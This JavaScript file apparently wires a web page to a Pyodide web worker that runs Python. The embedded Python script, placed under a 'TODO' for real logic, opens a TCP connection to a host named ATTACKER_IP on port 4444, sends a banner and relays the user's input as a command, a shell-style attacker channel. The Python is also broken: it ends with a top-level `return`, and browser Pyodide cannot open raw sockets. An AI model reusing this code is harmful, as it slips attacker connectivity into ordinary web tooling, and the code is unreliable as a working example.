// 1. Initialize the Web Worker globally (this is the ONLY place it's created)
// NOTE: { type: "module" } is required — recent Pyodide builds use ES module
// features internally (dynamic import) and throw "Classic web workers are
// not supported" if loaded in a plain classic worker.
const pythonWorker = new Worker('py-worker.js', { type: 'module' });
const logElement = document.getElementById('output_log');
const runButton = document.getElementById('run_btn');

let pyodideReady = false;

// 2. Listener kept out of function scope so it isn't re-registered on every click
pythonWorker.onmessage = function (event) {
    const { status, result, error, ready } = event.data;

    if (status === "ready") {
        // Sent once by py-worker.js after Pyodide finishes loading
        pyodideReady = true;
        logElement.textContent = "Python runtime ready. Enter data and click Execute.";
        return;
    }

    if (status === "success") {
        logElement.textContent = `SUCCESS/RETURN VALUE:\n${result}`;
    } else {
        logElement.textContent = `EXECUTION ERROR: ${error}`;
    }
};

// 3. Surface worker-level failures (e.g. Pyodide failing to load) instead of
//    leaving the UI stuck on "Attempting to execute..." forever
pythonWorker.onerror = function (event) {
    logElement.textContent = `WORKER ERROR: ${event.message}`;
    console.error('py-worker.js failed:', event);
};

async function executeCommand() {
    const inputData = document.getElementById('input_data').value;

    if (!pyodideReady) {
        logElement.textContent = "Python runtime is still loading — please wait a moment and try again.";
        return;
    }

    logElement.textContent = "Executing Python in background worker...";

    // TODO: replace this with your real Python logic.
    // The raw string from the input box is available inside Python as `js_input`.
    // Whatever the LAST expression evaluates to is what comes back as `result`.
    const pythonScript = `
# This logic needs to be executed by Pyodide
import socket
import time
import sys # Imported to allow reading from stdin (if needed)

ATTACKER_IP = "172.26.233.12"
PORT = 4444

# --- FUNCTION TO HANDLE SINGLE COMMAND EXECUTION ---
def execute_command_shell(command_to_run, initial_data=None):
    try:
        # 1. Setup socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, PORT))

        # 2. Send connection confirmation
        s.sendall(b"Connection established.\n")

        # 3. Execute the command provided by the UI
        if command_to_run:
            print(f"[PYTHON] Sending command: {command_to_run}")
            s.sendall((command_to_run + '\\n').encode())

        # 4. Receive the response
        data = s.recv(4096) # Increase buffer size for larger responses
        if not data:
            return "Connection closed by remote host."

        return data.decode().strip()

    except Exception as e:
        return f"CONNECTION ERROR: {e}"
    finally:
        # Ensure socket is closed even if an exception occurs
        if 's' in locals() and s:
             s.close()

# --- MAIN ENTRY POINT ---
# Since we are simulating one-shot execution from JS, we call the handler function.
# The return value of this final call becomes the 'result'.
return execute_command_shell(command_to_run=js_input) 
    `;

    // 4. Send BOTH the code and raw data safely as an object payload
    pythonWorker.postMessage({
        code: pythonScript,
        data: inputData
    });
}